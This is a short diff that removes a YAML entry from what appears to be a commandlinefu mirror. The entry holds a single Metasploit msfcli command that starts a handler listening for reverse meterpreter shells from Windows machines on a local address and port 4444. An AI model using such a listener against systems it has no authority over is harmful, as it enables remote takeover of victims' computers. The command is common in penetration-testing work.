@@ -1,8 +1,0 @@
-commandlinefu_id: 9502
-translator:
-  weibo: ''
-hide: true
-command: |-
-  msfcli payload=windows/meterpreter/reverse_tcp lhost=192.168.1.2 lport=4444 E
-summary: |-
-  Start handler in metasploit to listen for reverse meterpreter connections
